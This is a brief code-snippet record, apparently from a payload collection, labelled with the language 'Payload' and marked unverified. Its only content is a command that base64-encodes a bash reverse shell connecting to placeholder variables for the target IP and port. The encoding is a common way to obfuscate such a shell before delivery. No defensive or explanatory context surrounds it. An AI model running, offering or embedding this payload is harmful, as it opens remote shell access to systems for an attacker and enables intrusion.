---
id: 9abdb1a3-704d-47b4-9365-edf8db1db57c
type: code
language: Payload
verified: false
created_at: '2020-03-16T05:53:13.925797+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
---

# Code Snippet 9abdb1a3

**Language**: Payload

```payload
echo 'bash -i >& /dev/tcp/$_TARGET_IP/$_TARGET_PORT 0>&1' | base64 -w 0
```
